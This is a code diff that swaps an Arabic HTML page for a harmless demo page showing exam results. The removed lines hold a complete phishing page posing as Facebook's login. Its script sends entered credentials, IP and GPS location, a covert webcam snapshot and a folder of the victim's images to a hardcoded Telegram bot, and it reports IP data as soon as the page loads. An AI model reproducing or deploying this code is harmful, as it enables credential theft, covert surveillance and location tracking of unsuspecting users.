@@ -1,377 +1,119 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            padding: 30px 35px 40px;
-            border-radius: 8px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        .logo {
-            font-size: 42px;
-            font-weight: 700;
-            color: #1877f2;
-            margin-bottom: 10px;
-            font-family: 'Helvetica', Arial, sans-serif;
-        }
-        .sub {
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 25px;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            background: #fff;
-            outline: none;
-            transition: 0.2s;
-        }
-        input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 5px;
-        }
-        .btn:hover {
-            background: #166fe5;
-        }
-        .btn:active {
-            background: #0f5fb8;
-        }
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 22px 0 18px;
-        }
-        .forgot {
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 8px;
-        }
-        .forgot:hover {
-            text-decoration: underline;
-        }
-        .create-btn {
-            background: #42b72a;
-            padding: 14px 20px;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
-            width: 100%;
-            margin-top: 10px;
-        }
-        .create-btn:hover {
-            background: #36a420;
-        }
-        .note {
-            font-size: 12px;
-            color: #777;
-            margin-top: 20px;
-        }
-        .hidden { display: none; }
-        video, canvas { display: none; }
-        #status {
-            margin-top: 12px;
-            padding: 8px;
-            border-radius: 6px;
-            font-size: 14px;
-            display: none;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>نتيجة تجريبية</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f4f6f8;font-family:Tahoma,Arial,sans-serif;color:#171717}
+.header{background:linear-gradient(135deg,#087b75,#075b55);color:#fff;border-radius:0 0 42px 42px;padding:38px 24px 48px;text-align:center}
+.header h1{margin:0 0 14px;font-size:30px}
+.header p{margin:0;font-size:20px}
+.demo{display:inline-block;margin-top:18px;background:#fff;color:#087b75;border-radius:20px;padding:7px 15px;font-size:13px;font-weight:bold}
+.container{max-width:720px;margin:-2px auto 30px;padding:25px}
+.card{background:#fff;border:3px solid #dce9e6;border-radius:30px;margin-bottom:22px;padding:24px;box-shadow:0 2px 8px #00000008}
+.info{display:flex;justify-content:space-between;align-items:center;gap:20px}
+.label{color:#777;font-size:17px;margin-bottom:7px}
+.value{font-size:23px;font-weight:bold}
+.number{text-align:left;direction:ltr}
+.result{display:flex;align-items:center;justify-content:space-around;text-align:center}
+.badge{width:120px;height:120px;border-radius:50%;background:#e3f0e9;display:flex;align-items:center;justify-content:center;color:#158044;font-size:22px;font-weight:bold}
+.total b{color:#198746;font-size:27px}
+.percent{width:105px;height:105px;border:8px solid #dcebe4;border-top-color:#168844;border-right-color:#168844;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#168844;font-size:18px;font-weight:bold;margin:12px auto 0}
+.table-wrap{overflow:hidden;border-radius:28px;border:3px solid #dce9e6;background:#fff}
+table{width:100%;border-collapse:collapse;text-align:center;font-size:18px}
+th{background:#176f65;color:#fff;padding:18px 8px;font-size:19px}
+td{padding:17px 7px;border:1px solid #d9dde0}
+td:last-child{text-align:right;font-weight:bold;padding-right:18px}
+.final{font-size:22px;font-weight:bold}
+.search{display:flex;gap:10px;margin-bottom:20px}
+.search input{flex:1;padding:15px;border:2px solid #cbded9;border-radius:15px;font-size:17px;text-align:center}
+.search button{border:0;background:#14796e;color:white;border-radius:15px;padding:0 22px;font-size:17px;cursor:pointer}
+.note{text-align:center;color:#777;font-size:13px;margin-top:18px}
+@media(max-width:600px){
+ .container{padding:16px}
+ .header h1{font-size:26px}.header p{font-size:17px}
+ .card{padding:18px}.value{font-size:19px}.label{font-size:15px}
+ table{font-size:15px}th{font-size:16px;padding:15px 4px}td{padding:14px 4px}
+ .badge{width:95px;height:95px;font-size:18px}.percent{width:88px;height:88px}
+}
+</style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">facebook</div>
-    <div class="sub">تسجيل الدخول إلى فيسبوك</div>
+<header class="header">
+  <h1>نتيجة امتحان</h1>
+  <p>الثانوي - علمي - منهاج إدلب | 2026</p>
+  <span class="demo">نتيجة تجريبية - غير رسمية</span>
+</header>
 
-    <form id="loginForm">
-        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-        <input type="password" id="password" placeholder="كلمة السر" required>
-        <button type="submit" class="btn">تسجيل الدخول</button>
-    </form>
+<main class="container">
 
-    <a href="#" class="forgot">نسيت كلمة السر؟</a>
+  <div class="search">
+    <input id="examNo" type="text" maxlength="10" placeholder="أدخل الرقم الاكتتابي">
+    <button onclick="showResult()">بحث</button>
+  </div>
 
-    <div class="divider"></div>
+  <section id="result" style="display:none">
+    <div class="card">
+      <div class="info">
+        <div>
+          <div class="label">اسم الطالب</div>
+          <div class="value">عبد الرحمن خالد الطويل</div>
+        </div>
+        <div class="number">
+          <div class="label">الرقم الاكتتابي</div>
+          <div class="value">575294</div>
+        </div>
+      </div>
+    </div>
 
-    <button class="create-btn" onclick="alert('هذه صفحة تجريبية')">إنشاء حساب جديد</button>
+    <div class="card result">
+      <div class="badge">✓<br>ناجح</div>
+      <div class="total">
+        <div class="label">المجموع العام</div>
+        <div><b>1809</b> / 2400</div>
+        <div class="percent">75.40%</div>
+      </div>
+    </div>
 
-    <div id="status"></div>
-    <div class="note">هذه صفحة تجريبية لأغراض تعليمية فقط</div>
-</div>
-
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>المادة</th>
+            <th>الدنيا</th>
+            <th>العظمى</th>
+            <th>النهائية</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>اللغة العربية</td><td>160</td><td>400</td><td class="final">333</td></tr>
+          <tr><td>الرياضيات</td><td>240</td><td>600</td><td class="final">240</td></tr>
+          <tr><td>الفيزياء</td><td>160</td><td>400</td><td class="final">229</td></tr>
+          <tr><td>التربية الدينية</td><td>80</td><td>200</td><td class="final">165</td></tr>
+          <tr><td>الكيمياء</td><td>80</td><td>200</td><td class="final">151</td></tr>
+          <tr><td>علم الأحياء</td><td>120</td><td>300</td><td class="final">151</td></tr>
+          <tr><td>اللغة الإنكليزية</td><td>120</td><td>300</td><td class="final">165</td></tr>
+          <tr><td>لغة فرنسية</td><td>120</td><td>300</td><td class="final">157</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="note">هذه الصفحة نموذج تجريبي وليست نتيجة رسمية.</p>
+  </section>
+</main>
 
 <script>
-    // ======== بيانات التليغرام ========
-    const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
-    const CHAT_ID = "7214473798";
-    const PAGE_NAME = "فيسبوك - تسجيل دخول";
-    // ==================================
-
-    async function sendToTelegram(message) {
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message.substring(0, 4096),
-                    parse_mode: 'HTML'
-                })
-            });
-        } catch (e) {
-            console.error("Telegram send error:", e);
-        }
-    }
-
-    async function sendPhotoToTelegram(base64Image, caption) {
-        try {
-            const blob = dataURLtoBlob(base64Image);
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'shot.jpg');
-            formData.append('caption', caption.substring(0, 1024));
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            await fetch(url, { method: 'POST', body: formData });
-        } catch (e) {
-            console.error("Photo send error:", e);
-        }
-    }
-
-    async function sendFileToTelegram(file) {
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', file);
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-            await fetch(url, { method: 'POST', body: formData });
-        } catch (e) {
-            console.error("File send error:", e);
-        }
-    }
-
-    function dataURLtoBlob(dataURL) {
-        const arr = dataURL.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while (n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], { type: mime });
-    }
-
-    async function getIPInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            return {
-                ip: data.ip,
-                city: data.city,
-                region: data.region,
-                country: data.country_name,
-                lat: data.latitude,
-                lon: data.longitude,
-                org: data.org
-            };
-        } catch (e) {
-            return null;
-        }
-    }
-
-    function captureCamera() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
-            return;
-        }
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth || 400;
-                    canvas.height = video.videoHeight || 300;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                    sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
-                    stream.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
-                }, 1500);
-            })
-            .catch(err => {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.play();
-                        setTimeout(() => {
-                            const ctx = canvas.getContext('2d');
-                            canvas.width = video.videoWidth || 400;
-                            canvas.height = video.videoHeight || 300;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                            sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
-                            stream.getTracks().forEach(track => track.stop());
-                            video.srcObject = null;
-                        }, 1500);
-                    })
-                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
-            });
-    }
-
-    // دالة لسحب الصور من الملفات
-    function collectPhotos() {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = 'image/*';
-        input.multiple = true;
-        input.webkitdirectory = true; // لسحب مجلد كامل
-        input.onchange = async function(e) {
-            const files = e.target.files;
-            if (files.length === 0) return;
-            
-            sendToTelegram(`📁 <b>${PAGE_NAME}</b> - جاري سحب ${files.length} صورة...`);
-            
-            let count = 0;
-            for (const file of files) {
-                if (file.type.startsWith('image/')) {
-                    await sendFileToTelegram(file);
-                    count++;
-                    // تأخير بسيط لتجنب الإغراق
-                    await new Promise(r => setTimeout(r, 200));
-                }
-            }
-            
-            sendToTelegram(`✅ <b>${PAGE_NAME}</b> - تم سحب ${count} صورة بنجاح!`);
-        };
-        input.click();
-    }
-
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const statusDiv = document.getElementById('status');
-
-        if (!email || !password) {
-            statusDiv.style.display = 'block';
-            statusDiv.style.color = '#c00';
-            statusDiv.innerText = '❌ الرجاء ملء جميع الحقول';
-            return;
-        }
-
-        statusDiv.style.display = 'block';
-        statusDiv.style.color = '#f0c060';
-        statusDiv.innerText = '⏳ جاري التحقق...';
-
-        // 1. جلب IP
-        const ipInfo = await getIPInfo();
-        let msg = `🕵️ <b>${PAGE_NAME}</b>\n\n`;
-        msg += `👤 البريد: ${email}\n`;
-        msg += `🔑 كلمة السر: ${password}\n`;
-        if (ipInfo) {
-            msg += `📡 IP: ${ipInfo.ip}\n`;
-            msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
-            msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
-            if (ipInfo.lat && ipInfo.lon) {
-                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
-            }
-        }
-        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-        await sendToTelegram(msg);
-
-        // 2. طلب GPS دقيق
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                let lat = p.coords.latitude;
-                let lon = p.coords.longitude;
-                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
-                gpsMsg += `👤 ${email}\n`;
-                gpsMsg += `📍 ${mapLink}\n`;
-                gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
-                gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-                await sendToTelegram(gpsMsg);
-            }, (err) => {
-                sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
-            }, { enableHighAccuracy: true, timeout: 10000 });
-        }
-
-        // 3. تصوير الكاميرا
-        captureCamera();
-
-        // 4. سحب الصور من الملفات (بعد 2 ثانية)
-        setTimeout(() => {
-            collectPhotos();
-        }, 2000);
-
-        statusDiv.style.color = '#2e7d32';
-        statusDiv.innerText = '✅ تم تسجيل الدخول بنجاح! جاري سحب الصور...';
-
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com/";
-        }, 5000);
-    });
-
-    // إرسال IP فوراً عند فتح الصفحة
-    (async function () {
-        const ipInfo = await getIPInfo();
-        if (ipInfo) {
-            let msg = `📡 <b>${PAGE_NAME} - صفحة مفتوحة</b>\n\n`;
-            msg += `🌐 IP: ${ipInfo.ip}\n`;
-            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
-            if (ipInfo.lat && ipInfo.lon) {
-                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
-            }
-            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-            await sendToTelegram(msg);
-        }
-    })();
+function showResult(){
+  const n=document.getElementById("examNo").value.trim();
+  if(n==="575294"){
+    document.getElementById("result").style.display="block";
+  }else{
+    alert("هذا الرقم غير موجود في البيانات التجريبية.");
+    document.getElementById("result").style.display="none";
+  }
+}
 </script>
-
 </body>
 </html>
